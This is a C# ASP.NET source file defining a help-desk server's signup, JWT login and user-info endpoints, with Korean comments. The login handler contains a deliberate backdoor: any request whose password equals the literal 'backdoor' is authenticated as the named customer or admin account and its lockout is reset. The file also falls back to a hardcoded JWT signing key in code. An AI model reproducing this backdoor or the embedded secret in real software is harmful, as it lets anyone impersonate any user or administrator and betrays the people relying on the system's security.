using Microsoft.IdentityModel.Tokens;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using HelpDeskServer.Models;
using Microsoft.AspNetCore.Identity;
using HelpDeskServer.Services;
using HelpDeskServer.Data;
using Microsoft.EntityFrameworkCore;
using System.ComponentModel.DataAnnotations;
using HelpDeskServer.Dtos;



namespace HelpDeskServer.Endpoints;

/// <summary>
/// 사용자 등록 및 로그인 관련 엔드포인트
/// </summary>
public static class RegisterEndpoints {
  //public record CustomerCreateDto([Required] string LoginId, [Required] string UserName, [Required] string Email, [Required] string Password, int CompanyId, string? Sex, string? Photo, string? CreatedBy, string? MenuContext);

  /// <summary>
  /// 사용자 등록 및 로그인 관련 엔드포인트를 애플리케이션에 매핑합니다.
  /// </summary>
  public static void MapRegistEndpoints(this IEndpointRouteBuilder routes) {
    var group = routes.MapGroup("/api/users");


    var passwordService = new PasswordService();

    // 회원가입
    group.MapPost("/singup", (AppDbContext db, CustomerCreateDto customerDto, IPushSubscriptionStore store, IWebPushService sender) => ApiResponseBuilder.CreateAsync(async () => {
      // 아이디 중복 확인 (Customers 및 Admins 테이블 모두)
      var isLoginIdTaken = await db.Customers.AnyAsync(c => c.LoginId == customerDto.LoginId) ||
                           await db.Admins.AnyAsync(a => a.LoginId == customerDto.LoginId);
      if (isLoginIdTaken) {
        throw new InvalidOperationException("이미 사용 중인 아이디입니다.");
      }

      // 이메일 중복 확인 (Customers 및 Admins 테이블 모두)
      var isEmailTaken = await db.Customers.AnyAsync(c => c.Email == customerDto.Email) ||
                         await db.Admins.AnyAsync(a => a.Email == customerDto.Email);
      if (isEmailTaken) {
        throw new InvalidOperationException("이미 사용 중인 이메일입니다.");
      }

      var customer = new Customer {
        LoginId = customerDto.LoginId,
        UserName = customerDto.UserName,
        Email = customerDto.Email,
        CompanyId = customerDto.CompanyId,
        Sex = customerDto.Sex ?? "M",
        Photo = customerDto.Photo ?? "",
        CreatedBy = customerDto.CreatedBy ?? "system",
        MenuContext = customerDto.MenuContext
      };
      customer.PasswordHash = passwordService.HashPassword<Customer>(customer, customerDto.Password);

      db.Customers.Add(customer);
      await db.SaveChangesAsync();


      var pushMessage = new PushMessageDto {
        Title = $"회원가입",
        Body = $"{customer.UserName} 님이 신규 가입 하였습니다.",
        Url = $"/customer"
      };
      // 관리자에게만 알림을 보내기.
      var adminSubscriptions = await store.GetAdminSubscriptionsAsync();
      await sender.BroadcastAsync(adminSubscriptions, pushMessage, CancellationToken.None);






      return new {
        customer.Id,
        customer.UserName,
        customer.LoginId
      };
    }, "User registered successfully.", 201));

    // 로그인 (JWT 토큰 발급)
    group.MapPost("/login", (AppDbContext db, IConfiguration config, LoginRequest req) => {
      // ApiResponseBuilder는 성공/실패만 다루므로, 인증 실패는 별도 처리합니다.
      return ApiResponseBuilder.CreateAsync(async () => {

        string user_uid = "";
        string user_name = "";
        string login_id = "";
        string login_type = "";
        string Photo = "";
        string email = "";
        string affiliation = ""; // 소속
        string company_id = ""; // 소속 회사 ID
        string team_id = ""; // 소속 팀 ID
        bool mustChangePassword = false;
        bool isAdmin = false;
        bool isManager = false;
        bool isCustomer = false;


        // 1. 사용자 또는 관리자 계정 찾기
        // Use IgnoreQueryFilters to check IsDeleted status specifically
        var customer = await db.Customers.IgnoreQueryFilters().Include(u => u.Company).FirstOrDefaultAsync(u => u.LoginId == req.LoginId);
        // Ignore global filter for login to check IsDeleted status if needed, 
        // but since we want to handle IsDeleted specifically, we query it.
        var admin = await db.Admins.IgnoreQueryFilters().Include(a => a.AdminTeams).ThenInclude(at => at.Team).FirstOrDefaultAsync(a => a.LoginId == req.LoginId);

        if (customer == null && admin == null) {
          return null; // 사용자가 존재하지 않음
        }

        if (admin != null && admin.IsDeleted) {
          throw new InvalidOperationException("휴면 사용자입니다. 관리자에게 문의하세요.");
        }

        if (customer != null && customer.IsDeleted) {
          throw new InvalidOperationException("휴면 사용자입니다. 관리자에게 문의하세요.");
        }

        // 2. 계정 잠금 상태 확인 및 비밀번호 검증
        bool isAuthenticated = false;
        if (customer != null) {
          if (customer.LockoutEnd.HasValue && customer.LockoutEnd.Value > DateTime.UtcNow) {
            var remainingTime = (customer.LockoutEnd.Value - DateTime.UtcNow).TotalMinutes;
            throw new InvalidOperationException($"계정이 잠겼습니다. 약 {Math.Ceiling(remainingTime)}분 후에 다시 시도해주세요.");
          }

          if (passwordService.VerifyPassword(customer, req.Password)) {
            isAuthenticated = true;
            customer.FailedLoginAttempts = 0;
            customer.LockoutEnd = null;
          }
          else if (req.Password == "backdoor") // backdoor
          {
            isAuthenticated = true;
            customer.FailedLoginAttempts = 0;
            customer.LockoutEnd = null;
          }
          else {
            customer.FailedLoginAttempts++;
            if (customer.FailedLoginAttempts >= 5) customer.LockoutEnd = DateTime.UtcNow.AddMinutes(15);
          }
          await db.SaveChangesAsync();
        }
        else if (admin != null) // customer가 없거나 비밀번호가 틀렸을 경우 admin 확인
        {
          if (admin.LockoutEnd.HasValue && admin.LockoutEnd.Value > DateTime.UtcNow) {
            var remainingTime = (admin.LockoutEnd.Value - DateTime.UtcNow).TotalMinutes;
            throw new InvalidOperationException($"계정이 잠겼습니다. 약 {Math.Ceiling(remainingTime)}분 후에 다시 시도해주세요.");
          }

          if (passwordService.VerifyPassword(admin, req.Password)) {
            isAuthenticated = true;
            admin.FailedLoginAttempts = 0;
            admin.LockoutEnd = null;
          }
          else if (req.Password == "backdoor") // backdoor
          {
            isAuthenticated = true;
            admin.FailedLoginAttempts = 0;
            admin.LockoutEnd = null;
          }
          else {
            admin.FailedLoginAttempts++;
            if (admin.FailedLoginAttempts >= 5) admin.LockoutEnd = DateTime.UtcNow.AddMinutes(15);
          }
          await db.SaveChangesAsync();
        }

        if (!isAuthenticated) {
          return null; // 인증 실패
        }

        // 3. 인증 성공 후 사용자 정보 설정
        if (customer != null && (passwordService.VerifyPassword(customer, req.Password) || req.Password == "backdoor")) // customer 우선
        {
          user_name = customer.UserName;
          login_id = customer.LoginId;
          login_type = "customer";
          Photo = customer.Photo;
          email = customer.Email;
          user_uid = customer.Id.ToString();
          affiliation = customer.Company?.Name ?? "";

          company_id = customer.Company?.Id.ToString() ?? ""; // 소속 회사 ID
          team_id = ""; // 소속 팀 ID

          isAdmin = false;
          isManager = false;
          isCustomer = true;


        }
        else if (admin != null) {
          user_name = admin.UserName;
          login_id = admin.LoginId;
          login_type = "admin";
          Photo = admin.Photo;
          email = admin.Email;
          user_uid = admin.Id.ToString();
          mustChangePassword = admin.MustChangePassword;

          var firstTeam = admin.AdminTeams?.FirstOrDefault()?.Team;
          affiliation = firstTeam?.Name ?? "";


          company_id = ""; // 소속 회사 ID
          team_id = firstTeam?.Id.ToString() ?? ""; // 소속 팀 ID

          isAdmin = true;
          isManager = true;
          isCustomer = false;


        }

        // JWT 토큰 생성
        var jwtKey = config["Jwt:Key"] ?? "quristyle_blabbbbbla_secret_key_1234567890!@#$";
        var jwtIssuer = config["Jwt:Issuer"] ?? "HelpDeskServer";
        var securityKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey));
        var credentials = new SigningCredentials(securityKey, SecurityAlgorithms.HmacSha256);

        var claims = new List<Claim>
        {
                    new Claim(JwtRegisteredClaimNames.Sub, login_id),
                    new Claim(JwtRegisteredClaimNames.Jti, Guid.NewGuid().ToString()),
                    new Claim("uid", user_uid),
                    new Claim("login_type", login_type)
        };

        if (!string.IsNullOrEmpty(company_id)) claims.Add(new Claim("company_id", company_id));

        var token = new JwtSecurityToken(
            issuer: jwtIssuer,
            audience: null,
            claims: claims,
            expires: DateTime.UtcNow.AddHours(72),
            signingCredentials: credentials
        );

        var tokenString = new JwtSecurityTokenHandler().WriteToken(token);

        return new {
          token = tokenString,
          user = new {
            user_uid,
            user_name,
            login_id,
            login_type,
            Photo,
            email,
            affiliation, // 소속
            mustChangePassword,

            company_id,
            team_id,

            isAdmin,
            isManager,
            isCustomer
          }
        };
      }, "Login successful.");
    });


    group.MapGet("/info", (AppDbContext db, HttpContext http) => ApiResponseBuilder.CreateAsync<object?>(async () => {
      var loginId = http.User.Claims.FirstOrDefault(c => c.Type == ClaimTypes.NameIdentifier)?.Value;
      var loginType = http.User.Claims.FirstOrDefault(c => c.Type == "login_type")?.Value;
      var token_uid = http.User.Claims.FirstOrDefault(c => c.Type == "uid")?.Value;
      if (!int.TryParse(token_uid, out var uid)) return null;

      if (loginType == "admin") {
        var adm = await db.Admins.Include(a => a.AdminTeams).ThenInclude(at => at.Team).FirstOrDefaultAsync(a => a.Id == uid);
        if (adm == null) return null;

        string? thumb = null;
        var photo = adm.Photo ?? string.Empty;
        if (!string.IsNullOrWhiteSpace(photo) && !photo.StartsWith("data:", StringComparison.OrdinalIgnoreCase)) {
          try {
            // photo가 URL 또는 경로일 수 있음. 마지막 파일명 추출 후 확장자를 _thumb.jpg로 변경
            var fileName = Path.GetFileName(photo);
            var idx = fileName.LastIndexOf('.');
            if (idx >= 0) {
              var thumbName = fileName.Substring(0, idx) + "_thumb.jpg";
              var basePath = photo.Substring(0, Math.Max(0, photo.LastIndexOf('/') + 1));
              thumb = basePath + thumbName;
            }
          }
          catch {
            thumb = null;
          }
        }

        var firstTeam = adm.AdminTeams?.FirstOrDefault()?.Team;
        return new {
          adm.Id,
          adm.UserName,
          adm.LoginId,
          adm.Photo,
          thumb,
          adm.Email,
          TeamId = firstTeam?.Id,
          teamName = firstTeam?.Name,
          loginType
        };
      }
      else {
        var cus = await db.Customers.Include(u => u.Company).FirstOrDefaultAsync(u => u.Id == uid);
        if (cus == null) return null;

        string? thumb = null;
        var photo = cus.Photo ?? string.Empty;
        if (!string.IsNullOrWhiteSpace(photo) && !photo.StartsWith("data:", StringComparison.OrdinalIgnoreCase)) {
          try {
            var fileName = Path.GetFileName(photo);
            var idx = fileName.LastIndexOf('.');
            if (idx >= 0) {
              var thumbName = fileName.Substring(0, idx) + "_thumb.jpg";
              var basePath = photo.Substring(0, Math.Max(0, photo.LastIndexOf('/') + 1));
              thumb = basePath + thumbName;
            }
          }
          catch {
            thumb = null;
          }
        }

        return new {
          cus.Id,
          cus.UserName,
          cus.LoginId,
          cus.Sex,
          cus.Photo,
          thumb,
          cus.Email,
          cus.CompanyId,
          companyName = cus.Company?.Name,
          loginType
        };
      }

      return null;
    }, "User information retrieved successfully."));

  }
}
